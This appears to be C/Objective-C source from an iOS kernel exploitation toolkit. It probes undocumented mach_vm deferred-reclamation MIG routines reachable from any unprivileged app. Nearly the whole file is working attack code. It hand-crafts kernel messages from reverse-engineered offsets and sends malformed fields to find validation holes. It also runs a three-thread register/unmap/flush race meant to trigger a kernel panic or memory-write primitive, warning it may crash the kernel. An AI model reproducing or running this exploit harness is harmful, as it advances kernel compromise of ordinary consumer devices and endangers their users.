//  probe_machvm_dr.m - DirtySlide ROW G: MACH-VM DEFERRED-RECLAMATION (v160)
//  The 23G83 kernel RE pinned a NEW mach_vm MIG family: subsystem @0xfffffff007c8ddf8
//  start=4800 end=4830 - slots 4825-4829 are the deferred-reclamation (DRB) family,
//  callable from ANY app on its OWN task port (mach_task_self), ZERO entitlements:
//    4825 REGISTER  impl 0xa804f68: inline {tag,start,end}[] - version==1,
//        tag&0x00FFFFFFFFFFFFFF == 0x0002000000000000 (TOP BYTE IS USER-BYTES ->
//        rides the vm-enter flags as bits 24-31!), page-aligned, no-carry,
//        map-bounds containment, non-decreasing starts, shadow cap 1024 entries
//        (task+0x8c u16), NO guarded/wired-page validation.
//    4826 QUERY     impl 0xa7e91b0: u32 in -> {u64,u64} out (flush counters).
//    4827 DUMP      impl: u64[] in (<=1024) -> capped array out.
//    4828 STATUS    impl 0xa7ea140: no args -> {counter, token} (0,0 = no DRB).
//    4829 UNREG     impl 0xa7b9bc4: {addr,size,scratch,u64,u64,f1<2,f2&0xffbffe==0}.
//  Wire (stub-pinned): Head(0x18)+NDR(8)+version(+0x20)+count(+0x24)+entries(+0x28);
//  msgh_size = round4(count)+0x30 (register), 0x2c (query), 0x20 (status),
//  0x58 (unreg), count*8+0x30 (dump). Reply RetCode @ +0x28 (reject path).
//  GOAL: register/race/flush churn -> kernel desync/panic = THE 64747 write.
//  ZERO epoch cost (no videocodecd ops). MAY CRASH KERNEL.
#include "ds_core.h"

/* mach_vm.h is guarded out of the iOS SDK - the libsystem_kernel symbols exist */
extern kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address,
                                      mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address,
                                        mach_vm_size_t size);

#define DS_MV_REG     4825
#define DS_MV_QUERY   4826
#define DS_MV_DUMP    4827
#define DS_MV_STATUS  4828
#define DS_MV_UNREG   4829
#define DS_MV_DEALLOC 4801

#define DS_MV_TAG_LO  0x0002000000000000ULL
#define DS_MV_MAXE    42            /* stub byte-cap 0x400 / 0x18 */
#define DS_MV_SHADOW_CAP 1024

static volatile int g_mv_stop = 0;
static volatile long g_mv_reg_ok = 0, g_mv_reg_bad = 0, g_mv_timeouts = 0;

/* v167: the REAL mach_msg2 path - packing CORRECTED from the task_info /
 * host_info stubs: x2 = (send_size<<32) | 0x1513 (both stubs carry their exact
 * 40-byte request size in x2's HIGH 32 - 0x28 = Head+flavor+count), x6 = the
 * RCV capacity (task_info passes its reply size 0x1a8 there), and the reply
 * lands IN-PLACE over the request buffer (v166 read a never-touched scratch
 * buffer = the all-zero replies; 4828's rcv error 0x10004024 = the reply
 * capacity was the tiny send size). */
extern mach_port_t mig_get_reply_port(void);
typedef kern_return_t (*ds_pMachMsg2Trap)(void *, uint64_t, uint64_t, uint64_t,
                                          uint64_t, uint64_t, uint64_t, uint64_t);
static ds_pMachMsg2Trap pM2T;
#define DS_M2_OPTION   0x200000003ULL
#define DS_M2_MIGLOW   0x1513ULL

static kern_return_t ds_mv_roundtrip_sz(uint8_t *buf, mach_msg_size_t sendSize,
                                        mach_msg_size_t rcvCap, int *noReply, int guarded)
{
    mach_port_t rp = mig_get_reply_port();
    if (rp == MACH_PORT_NULL || !pM2T) return (kern_return_t)0xe0007d01;
    mach_msg_header_t *h = (mach_msg_header_t *)buf;
    h->msgh_local_port = rp;
    /* v169: msgh_bits = 0x1513 = COPY_SEND(19)|MAKE_SEND_ONCE(21)<<8 - the
     * CANONICAL MIG pair (my 0x1311 = MOVE_SEND|COPY_SEND was rejected by the
     * DRB routines' typed validators with MIG_BAD_ARGUMENTS; 4801's old path
     * tolerated it, which masked the bug). The real task_info literal = 0x1513. */
    h->msgh_bits = 0x1513;
    uint64_t task = mach_task_self();
    uint64_t a2 = ((uint64_t)sendSize << 32) | DS_M2_MIGLOW;
    uint64_t a3 = (task & 0xffffffffULL) | ((uint64_t)rp << 32);
    uint64_t a4 = (uint64_t)h->msgh_id << 32;
    uint64_t a5 = (uint64_t)rp << 32;
    if (guarded) {
        __block kern_return_t kr = KERN_FAILURE;
        __block int grc = 0;
        int gsig = ds_ave_guard_run_tmo(^int {
            kr = pM2T(buf, DS_M2_OPTION, a2, a3, a4, a5, (uint64_t)rcvCap, 0ULL);
            return 0;
        }, &grc, 4000);
        if (gsig != 0 || kr == MACH_RCV_INTERRUPTED) { if (noReply) *noReply = 1; return (kern_return_t)0xe0007d00; }
        return kr;
    }
    /* worker-only: NO guard (single-owner global state - the 18:48:56
     * CODESIGNING stack kill was two detached workers sigsetjmp/SIGALRM-ing
     * into the row thread's guard context). */
    kern_return_t kr = pM2T(buf, DS_M2_OPTION, a2, a3, a4, a5, (uint64_t)rcvCap, 0ULL);
    if (kr == MACH_RCV_INTERRUPTED) { if (noReply) *noReply = 1; return (kern_return_t)0xe0007d00; }
    return kr;
}

static kern_return_t ds_mv_roundtrip(uint8_t *req, mach_msg_size_t reqSize,
                                     uint8_t *rep, mach_msg_size_t repCap, int *noReply)
{
    (void)rep;
    return ds_mv_roundtrip_sz(req, reqSize, repCap, noReply, 1);
}

static kern_return_t ds_mv_roundtrip_raw(uint8_t *req, mach_msg_size_t reqSize,
                                         uint8_t *rep, mach_msg_size_t repCap, int *noReply)
{
    (void)rep;
    return ds_mv_roundtrip_sz(req, reqSize, repCap, noReply, 0);
}

/* kr-name for receipts */
static const char *ds_mv_krname(kern_return_t k)
{
    switch (k) {
    case KERN_SUCCESS: return "SUCCESS";
    case KERN_INVALID_ADDRESS: return "INV_ADDR";
    case KERN_PROTECTION_FAILURE: return "PROT";
    case KERN_NO_ACCESS: return "NO_ACCESS";
    case KERN_FAILURE: return "FAILURE";
    case KERN_INVALID_ARGUMENT: return "INV_ARG";
    case KERN_NOT_SUPPORTED: return "NOT_SUPPORTED(46)";
    default: return "?";
    }
}

static void ds_mv_replyhex(const char *pfx, const char *tag, const uint8_t *r, mach_msg_size_t n)
{
    dprintf(STDOUT_FILENO, "%s  I[%s] reply:", pfx, tag);
    uint32_t lim = n < 0x40 ? n : 0x40;
    for (uint32_t i = 0; i < lim; i++) dprintf(STDOUT_FILENO, "%s%02x", (i % 8) ? "" : " ", r[i]);
    dprintf(STDOUT_FILENO, "\n");
}

/* send one hand-rolled MIG request; prints the full receipt. req[0x18..] is body
 * (NDR + args); header filled here. Reply buffer 0x100. Returns mach_msg kr and
 * writes the parsed RetCode candidates. */
static kern_return_t ds_mv_call(const char *pfx, const char *tag, uint32_t msgid,
                                uint8_t *req, mach_msg_size_t reqSize, int dump,
                                mach_msg_size_t rcvCap)
{
    mach_msg_header_t *h = (mach_msg_header_t *)req;
    memset(req, 0, 0x18);
    h->msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    h->msgh_size        = reqSize;
    h->msgh_remote_port = mach_task_self();
    h->msgh_local_port  = MACH_PORT_NULL;   /* ds_mv_roundtrip installs the fresh port */
    h->msgh_voucher_port = 0;
    h->msgh_id          = (mach_msg_id_t)msgid;

    int noReply = 0;
    kern_return_t kr = ds_mv_roundtrip(req, reqSize, req, rcvCap, &noReply);
    if (noReply) {
        g_mv_timeouts++;
        dprintf(STDOUT_FILENO, "%s  I[%s] id=%u sz=%u NO-REPLY (guard watchdog / interrupt) - kernel ignored the layout\n",
                pfx, tag, msgid, reqSize);
        return (kern_return_t)0xe0007d00;
    }
    if (kr != KERN_SUCCESS) {
        dprintf(STDOUT_FILENO, "%s  I[%s] id=%u sz=%u mach_msg2=%s (%#x) [send/rcv error]\n",
                pfx, tag, msgid, reqSize, ds_mv_krname(kr), kr);
        return kr;
    }
    mach_msg_header_t *rh = (mach_msg_header_t *)req;   /* reply lands IN-PLACE */
    uint32_t c1c = *(uint32_t *)(req + 0x1c), c20 = *(uint32_t *)(req + 0x20), c28 = *(uint32_t *)(req + 0x28);
    dprintf(STDOUT_FILENO, "%s  I[%s] id=%u sz=%u -> reply id=%u sz=%u ret@1c=%08x @20=%08x @28=%08x\n",
            pfx, tag, msgid, reqSize, rh->msgh_id, rh->msgh_size, c1c, c20, c28);
    if (dump) ds_mv_replyhex(pfx, tag, req, rh->msgh_size);
    return KERN_SUCCESS;
}

/* 4825 register: the wire REQUIRES msgh_size in [0x431,0x831] (the MIG size
 * window - v167's 72-byte register = MIG_BAD_ARGUMENTS). count = the array
 * BYTES (mult of 0x18) at +0x24, size = round4(count)+0x30 -> the legal
 * register = 43..85 entries. ds_mv_register pads to 43 entries (0x408 bytes,
 * size 0x438) from the pool; ss holds n real (start,size) pairs first. */
#define DS_MV_REGN   43
#define DS_MV_REGBY  (DS_MV_REGN * 0x18)   /* 0x408 */
#define DS_MV_REGSIZ (DS_MV_REGBY + 0x30)  /* 0x438 */
static void ds_mv_register(const char *pfx, const char *tag, const uint64_t *ss, int n,
                           int tagHi, int version, int dump)
{
    uint8_t req[DS_MV_REGSIZ + 0x10];
    memset(req, 0, sizeof(req));
    *(uint32_t *)(req + 0x20) = (uint32_t)version;
    *(uint32_t *)(req + 0x24) = DS_MV_REGBY;
    for (int i = 0; i < DS_MV_REGN; i++) {
        int j = i < n ? i : (n > 0 ? n - 1 : 0);   /* pad by repeating the last real entry */
        uint64_t tg = DS_MV_TAG_LO | ((uint64_t)(uint8_t)tagHi << 56);
        uint64_t st = ss[j * 2], en = st + ss[j * 2 + 1];
        memcpy(req + 0x28 + i * 0x18, &tg, 8);
        memcpy(req + 0x28 + i * 0x18 + 8, &st, 8);
        memcpy(req + 0x28 + i * 0x18 + 16, &en, 8);
    }
    (void)ds_mv_call(pfx, tag, DS_MV_REG, req, DS_MV_REGSIZ, dump, sizeof(req));
}

/* 4828 status: the stub wants size == 0x20 but v167's receipt = MIG_BAD_ARGUMENTS
 * at 0x20 too -> the dispatcher argsize may differ. MV11 sweeps the sizes. */
static void ds_mv_status(const char *pfx, const char *tag, int dump)
{
    uint8_t req[0x40];
    memset(req, 0, sizeof(req));
    ds_mv_call(pfx, tag, DS_MV_STATUS, req, 0x20, dump, 0x40);
}

/* 4826 query/flush with a u32 param */
static void ds_mv_query(const char *pfx, const char *tag, uint32_t param, int dump)
{
    uint8_t req[0x40];
    memset(req, 0, sizeof(req));
    *(uint32_t *)(req + 0x20) = param;
    ds_mv_call(pfx, tag, DS_MV_QUERY, req, 0x2c, dump, 0x40);
}

/* 4829 unregister {addr,size} */
static void ds_mv_unreg(const char *pfx, const char *tag, uint64_t addr, uint64_t size, int dump)
{
    uint8_t req[0x60];
    memset(req, 0, sizeof(req));
    *(uint64_t *)(req + 0x20) = addr;
    *(uint64_t *)(req + 0x28) = size;
    /* +0x30 scratch (out), +0x38/+0x40 scalars 0, +0x48 f1=0, +0x4c f2=0 */
    ds_mv_call(pfx, tag, DS_MV_UNREG, req, 0x58, dump, 0x60);
}

/* 4827 dump discovery: count u64s in */
static void ds_mv_dump(const char *pfx, const char *tag, uint32_t count, int dump)
{
    uint8_t req[0x2038];
    memset(req, 0, 0x40);
    *(uint32_t *)(req + 0x20) = count;
    mach_msg_size_t sz = (mach_msg_size_t)(count * 8 + 0x30);
    if (sz > 0x2030) sz = 0x2030;
    ds_mv_call(pfx, tag, DS_MV_DUMP, req, sz, dump, 0x2038);
}

/* 4801 dealloc CONTROL (proves the MIG plumbing + RetCode offset) */
static void ds_mv_dealloc_ctl(const char *pfx, const char *tag, uint64_t addr, uint64_t size)
{
    uint8_t req[0x40];
    memset(req, 0, sizeof(req));
    *(uint64_t *)(req + 0x20) = addr;
    *(uint64_t *)(req + 0x28) = size;
    ds_mv_call(pfx, tag, DS_MV_DEALLOC, req, 0x30, 1, 0x40);
}

/* ---- race workers ---- */
static uint64_t *g_mv_pages;      /* page addrs */
static int g_mv_npages;
static volatile int g_mv_shift = 0;

static void *ds_mv_race_reg(void *arg)
{
    (void)arg;
    uint8_t req[DS_MV_REGSIZ + 0x10];
    long rounds = 0;
    while (!g_mv_stop) {
        memset(req, 0, sizeof(req));
        *(uint32_t *)(req + 0x20) = 1;
        *(uint32_t *)(req + 0x24) = DS_MV_REGBY;
        for (int i = 0; i < DS_MV_REGN; i++) {
            int p = (g_mv_shift + i) % g_mv_npages;
            uint64_t tg = DS_MV_TAG_LO;
            uint64_t st = g_mv_pages[p], en = st + 0x1000;
            memcpy(req + 0x28 + i * 0x18, &tg, 8);
            memcpy(req + 0x28 + i * 0x18 + 8, &st, 8);
            memcpy(req + 0x28 + i * 0x18 + 16, &en, 8);
        }
        mach_msg_header_t *h = (mach_msg_header_t *)req;
        h->msgh_bits = 0x1513;
        h->msgh_size = DS_MV_REGSIZ;
        h->msgh_remote_port = mach_task_self();
        h->msgh_local_port = MACH_PORT_NULL;   /* roundtrip installs mig_get_reply_port() */
        h->msgh_id = DS_MV_REG;
        uint8_t rep[0x40];
        int nr = 0;
        kern_return_t kr = ds_mv_roundtrip_raw(req, DS_MV_REGSIZ, rep, 0x40, &nr);
        if (kr != KERN_SUCCESS || nr) { g_mv_timeouts++; usleep(1000); continue; }
        else g_mv_reg_ok++;
        g_mv_shift = (g_mv_shift + 1) % g_mv_npages;
        rounds++;
    }
    return (void *)rounds;
}

static void *ds_mv_race_unmap(void *arg)
{
    (void)arg;
    long rounds = 0;
    while (!g_mv_stop) {
        int p = (int)(arc4random_uniform((uint32_t)g_mv_npages));
        munmap((void *)g_mv_pages[p], 0x1000);
        void *m = mmap((void *)g_mv_pages[p], 0x1000, PROT_READ | PROT_WRITE,
                       MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0);
        if (m == MAP_FAILED) g_mv_pages[p] = (uint64_t)(uintptr_t)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        rounds++;
        usleep(200);
    }
    return (void *)rounds;
}

static void *ds_mv_race_flush(void *arg)
{
    (void)arg;
    long rounds = 0;
    while (!g_mv_stop) {
        uint8_t req[0x40], rep[0x40];
        memset(req, 0, sizeof(req));
        *(uint32_t *)(req + 0x20) = 1;
        mach_msg_header_t *h = (mach_msg_header_t *)req;
        h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
        h->msgh_size = 0x2c;
        h->msgh_remote_port = mach_task_self();
        h->msgh_local_port = MACH_PORT_NULL;   /* roundtrip installs the fresh port */
        h->msgh_id = DS_MV_QUERY;
        int nr = 0;
        kern_return_t kr = ds_mv_roundtrip_raw(req, 0x2c, rep, sizeof(rep), &nr);
        if (kr != KERN_SUCCESS || nr) g_mv_timeouts++; else g_mv_reg_bad++;
        rounds++;
        usleep(500);
    }
    return (void *)rounds;
}

void probe_machvm_dr(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== G. MACH-VM DRB (v169 - canonical MIG bits 0x1513) ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  RE: reg impl 0xa804f68 (tag 0x2000000000000 hi-byte=FREE -> vm-enter flags bits24-31),\n", pfx);
    dprintf(STDOUT_FILENO, "%s  query 0xa7e91b0, status 0xa7ea140, unreg 0xa7b9bc4; shadow cap 1024 @task+0x8c.\n", pfx);


    pM2T = (ds_pMachMsg2Trap)dlsym(RTLD_DEFAULT, "mach_msg2_trap");
    if (!pM2T) {
        dprintf(STDOUT_FILENO, "%s  FATAL: mach_msg2_trap not exported\n", pfx);
        return;
    }
    dprintf(STDOUT_FILENO, "%s  I[init] mach_msg2_trap resolved %p - the 0x200000003 MIG-caller path\n", pfx, (void *)pM2T);

    /* MV00: MIG-plumbing CONTROL - real allocate, hand-rolled 4801 dealloc */
    ds_journal_write("START", "MV00 dealloc-ctl");
    {
        mach_vm_address_t a = 0;
        kern_return_t kr = mach_vm_allocate(mach_task_self(), &a, 0x1000, VM_FLAGS_ANYWHERE);
        dprintf(STDOUT_FILENO, "%s  I[MV00] real mach_vm_allocate 0x1000 -> %s (%d) addr=%llx\n",
                pfx, ds_mv_krname(kr), kr, (unsigned long long)a);
        if (kr == KERN_SUCCESS) {
            ds_mv_dealloc_ctl(pfx, "MV00 dealloc-ctl", a, 0x1000);
            dprintf(STDOUT_FILENO, "%s  I[MV00] control = hand-rolled MIG pipe verdict (ret@28==0 = pipe OK)\n", pfx);
        }
    }
    ds_journal_write("DONE", "MV00 dealloc-ctl");

    /* MV01: STATUS baseline (the feature/DRB oracle) */
    ds_journal_write("START", "MV01 status-base");
    ds_mv_status(pfx, "MV01 status-base", 1);
    ds_journal_write("DONE", "MV01 status-base");

    /* MV02: REGISTER 43 pages (the wire-legal minimum message) */
    static uint64_t g_ss[DS_MV_REGN * 2];
    for (int i = 0; i < DS_MV_REGN; i++) {
        void *pg = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        if (pg == MAP_FAILED) { dprintf(STDOUT_FILENO, "%s  FATAL: mmap failed\n", pfx); return; }
        g_ss[i * 2] = (uint64_t)(uintptr_t)pg; g_ss[i * 2 + 1] = 0x1000;
    }
    ds_journal_write("START", "MV02 reg-43page");
    ds_mv_register(pfx, "MV02 reg-43page", g_ss, DS_MV_REGN, 0, 1, 1);
    ds_journal_write("DONE", "MV02 reg-43page");

    /* MV03: STATUS after register */
    ds_journal_write("START", "MV03 status-post");
    ds_mv_status(pfx, "MV03 status-post", 1);
    ds_journal_write("DONE", "MV03 status-post");

    /* MV04: QUERY/FLUSH param sweep */
    {
        static const uint32_t qp[] = { 1, 0x10, 0x100, 0x400, 0xffffffff };
        char tg[32];
        for (int i = 0; i < 5; i++) {
            snprintf(tg, sizeof(tg), "MV04 query p=%#x", qp[i]);
            ds_journal_write("START", tg);
            ds_mv_query(pfx, tg, qp[i], (i == 0));
            ds_journal_write("DONE", tg);
        }
    }

    /* MV05: UNREGISTER + STATUS (the full lifecycle receipt) */
    ds_journal_write("START", "MV05 unreg");
    ds_mv_unreg(pfx, "MV05 unreg", g_ss[0], g_ss[1], 1);
    ds_mv_status(pfx, "MV05 unreg-post", 1);
    ds_journal_write("DONE", "MV05 unreg");

    /* MV06 v168: GATE-DISCOVERY at the IMPL level - a wire-legal 43-entry
     * message with ONE hostile field. Receipt decode: 0xfffffed0 = wire reject
     * (shape wrong), 4 = the impl's KERN_INVALID_ARGUMENT (the gate WORKED),
     * 0 = THE GATE HOLE. */
    ds_journal_write("START", "MV06 negatives");
    {
        uint8_t req[DS_MV_REGSIZ + 0x10];
        static const struct { const char *nm; int mode; } cells[] = {
            { "ver=0",       1 }, { "ver=2",     2 }, { "tagbad",  3 },
            { "unaligned",   4 }, { "size0",     5 }, { "wrap",    6 },
            { "count-non24", 7 }, { "hi-entry",  8 },
        };
        for (size_t c = 0; c < sizeof(cells) / sizeof(cells[0]); c++) {
            char tg[40];
            snprintf(tg, sizeof(tg), "MV06 neg-%s", cells[c].nm);
            memset(req, 0, sizeof(req));
            *(uint32_t *)(req + 0x20) = (cells[c].mode == 1) ? 0 : (cells[c].mode == 2) ? 2 : 1;
            *(uint32_t *)(req + 0x24) = DS_MV_REGBY;
            for (int i = 0; i < DS_MV_REGN; i++) {
                uint64_t tg64 = DS_MV_TAG_LO;
                uint64_t st = g_ss[i * 2], en = st + 0x1000;
                if (cells[c].mode == 3 && i == 0) tg64 = 0x0001000000000000;
                if (cells[c].mode == 4 && i == 0) st = g_ss[0] + 8;
                if (cells[c].mode == 5 && i == 0) en = st;
                if (cells[c].mode == 6 && i == 0) { st = 0xfffffffff0000000ULL; en = st + 0x20000000ULL; }
                memcpy(req + 0x28 + i * 0x18, &tg64, 8);
                memcpy(req + 0x28 + i * 0x18 + 8, &st, 8);
                memcpy(req + 0x28 + i * 0x18 + 16, &en, 8);
            }
            mach_msg_size_t sz = DS_MV_REGSIZ;
            uint32_t cnt = DS_MV_REGBY;
            if (cells[c].mode == 7) { cnt = DS_MV_REGBY + 4; sz = ((cnt + 3) & ~3u) + 0x30; }
            if (cells[c].mode == 8) { cnt = DS_MV_REGBY + 0x18; sz = ((cnt + 3) & ~3u) + 0x30; *(uint32_t *)(req + 0x24) = cnt;
                uint64_t tg64 = DS_MV_TAG_LO, st = g_ss[0], en = st + 0x1000;
                memcpy(req + 0x28 + DS_MV_REGN * 0x18, &tg64, 8);
                memcpy(req + 0x28 + DS_MV_REGN * 0x18 + 8, &st, 8);
                memcpy(req + 0x28 + DS_MV_REGN * 0x18 + 16, &en, 8); }
            ds_journal_write("START", tg);
            ds_mv_call(pfx, tg, DS_MV_REG, req, sz, 0, sizeof(req));
            ds_journal_write("DONE", tg);
        }
        dprintf(STDOUT_FILENO, "%s  I[MV06] decode: 0xfffffed0=wire-reject, 4=impl-gate OK, 0=THE HOLE\n", pfx);
    }
    ds_journal_write("DONE", "MV06 negatives");

    /* MV07 v168: TAG-HI-BYTE sweep - legal 43-entry messages, the tag top byte
     * varied (it rides the vm-enter flags bits 24-31). All-gates-same receipts
     * = the byte is inert OR the feature gate is closed. */
    ds_journal_write("START", "MV07 taghi");
    {
        static const int his[] = { 0x01, 0x04, 0x10, 0x20, 0x40, 0x80, 0xff };
        char tg[32];
        for (size_t i = 0; i < sizeof(his) / sizeof(his[0]); i++) {
            snprintf(tg, sizeof(tg), "MV07 taghi=%02x", his[i]);
            ds_journal_write("START", tg);
            ds_mv_register(pfx, tg, g_ss, DS_MV_REGN, his[i], 1, 0);
            ds_mv_status(pfx, tg, 0);
            ds_journal_write("DONE", tg);
        }
    }
    ds_journal_write("DONE", "MV07 taghi");

    /* MV08: THE RACE - register x unmap/remap x flush concurrently */
    ds_journal_write("START", "MV08 race");
    {
        g_mv_npages = 64;
        g_mv_pages = malloc(sizeof(uint64_t) * (size_t)g_mv_npages);
        int ok = (g_mv_pages != NULL);
        for (int i = 0; ok && i < g_mv_npages; i++) {
            void *m = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
            if (m == MAP_FAILED) { ok = 0; break; }
            g_mv_pages[i] = (uint64_t)(uintptr_t)m;
        }
        if (!ok) {
            dprintf(STDOUT_FILENO, "%s  I[MV08] mmap pool failed - race skipped\n", pfx);
        } else {
            g_mv_stop = 0; g_mv_reg_ok = 0; g_mv_reg_bad = 0; g_mv_timeouts = 0;
            pthread_t t1, t2, t3;
            pthread_attr_t da;
            pthread_attr_init(&da);
            pthread_attr_setdetachstate(&da, PTHREAD_CREATE_DETACHED);
            pthread_create(&t1, &da, ds_mv_race_reg, NULL);
            pthread_create(&t2, &da, ds_mv_race_unmap, NULL);
            pthread_create(&t3, &da, ds_mv_race_flush, NULL);
            pthread_attr_destroy(&da);
            uint64_t t0 = mach_absolute_time();
            sleep(6);
            g_mv_stop = 1;
            usleep(300000);   /* let in-flight rounds land (workers detached - no join) */
            double ms = ds_ave_elapsed_ms(t0);
            dprintf(STDOUT_FILENO, "%s  I[MV08] race done %.0fms: reg_ok=%ld query_ok=%ld timeouts=%ld "
                    "(timeout burst = kernel-wedge oracle; PANIC = THE 64747 write)\n",
                    pfx, ms, g_mv_reg_ok, g_mv_reg_bad, g_mv_timeouts);
            ds_mv_status(pfx, "MV08 post-race status", 1);
            int cleaned = 0;
            for (int i = 0; i < g_mv_npages; i++) {
                if (g_mv_pages[i]) {
                    uint64_t e[2] = { g_mv_pages[i], 0x1000 };
                    if (cleaned % 16 == 0) ds_mv_unreg(pfx, "MV08 cleanup", e[0], e[1], 0);
                    else { uint8_t rq[0x60]; memset(rq, 0, sizeof(rq)); *(uint64_t *)(rq + 0x20) = e[0]; *(uint64_t *)(rq + 0x28) = e[1]; int dn = 0; ds_mv_roundtrip_raw(rq, 0x58, rq, 0x60, &dn); }
                    cleaned++;
                    munmap((void *)(uintptr_t)g_mv_pages[i], 0x1000);
                }
            }
            dprintf(STDOUT_FILENO, "%s  I[MV08] cleanup: %d unregs sent\n", pfx, cleaned);
            free(g_mv_pages); g_mv_pages = NULL;
        }
    }
    ds_journal_write("DONE", "MV08 race");

    /* MV09: SHADOW-CAP grind - 24x42 = 1008 entries then one more (cap oracle) */
    ds_journal_write("START", "MV09 cap-grind");
    {
        int np = 1100;
        uint64_t *pp = malloc(sizeof(uint64_t) * (size_t)np);
        int got = 0;
        for (int i = 0; i < np; i++) {
            void *m = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
            if (m == MAP_FAILED) break;
            pp[got++] = (uint64_t)(uintptr_t)m;
        }
        dprintf(STDOUT_FILENO, "%s  I[MV09] pool=%d pages\n", pfx, got);
        int msgi = 0;
        for (int base = 0; base + DS_MV_REGN <= got; base += DS_MV_REGN) {
            char tg[32];
            snprintf(tg, sizeof(tg), "MV09 fill#%02d", ++msgi);
            ds_mv_register(pfx, tg, pp + base * 2, DS_MV_REGN, 0, 1, 0);
        }
        /* one more over the 1024 shadow cap -> expect ret 3 */
        if (got >= DS_MV_REGN) {
            ds_mv_register(pfx, "MV09 over-cap", pp, DS_MV_REGN, 0, 1, 0);
        }
        ds_mv_status(pfx, "MV09 status-full", 1);
        int drained = 0;
        for (int i = 0; i < got; i++) {
            if (drained % 32 == 0) ds_mv_unreg(pfx, "MV09 drain", pp[i], 0x1000, 0);
            else { uint8_t rq[0x60]; memset(rq, 0, sizeof(rq)); *(uint64_t *)(rq + 0x20) = pp[i]; *(uint64_t *)(rq + 0x28) = 0x1000; int dn = 0; ds_mv_roundtrip_raw(rq, 0x58, rq, 0x60, &dn); }
            drained++;
            munmap((void *)(uintptr_t)pp[i], 0x1000);
        }
        dprintf(STDOUT_FILENO, "%s  I[MV09] drain: %d unregs sent\n", pfx, drained);
        ds_mv_status(pfx, "MV09 status-drained", 1);
        free(pp);
    }
    ds_journal_write("DONE", "MV09 cap-grind");

    /* MV10: DUMP discovery */
    ds_journal_write("START", "MV10 dump");
    ds_mv_dump(pfx, "MV10 dump-c0", 0, 1);
    ds_mv_dump(pfx, "MV10 dump-c1", 1, 1);
    ds_journal_write("DONE", "MV10 dump");

    /* beats - the system-alive witnesses (a kernel wedge shows here) */
    for (int b = 1; b <= 2; b++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "MVH%02d beat", b);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
        usleep(300000);
    }

    dprintf(STDOUT_FILENO, "%s  G read-offs: RetCode lives at reply+0x28 (0xfffffed0 = MIG-reject = the slot\n", pfx);
    dprintf(STDOUT_FILENO, "%s  EXISTS; @20/@24 raw shows the real kr slot if the reject lands elsewhere).\n", pfx);
    dprintf(STDOUT_FILENO, "%s  MV02 ret=46 (0x2e) = task feature-bit OFF (reclamation not enabled for us);\n", pfx);
    dprintf(STDOUT_FILENO, "%s  ret=0 + MV03 counters move = REGISTER LANDED (the whole family is live).\n", pfx);
    dprintf(STDOUT_FILENO, "%s  MV06 any 0 = validation hole. MV07 = the tag-hi byte reaching vm-enter flags.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  MV08 timeout-burst/PANIC = the TOCTOU write. MV09 over-cap ret=3 = shadow cap.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  sweep done - .ips captureTime <-> [stamp]\n", pfx);
}
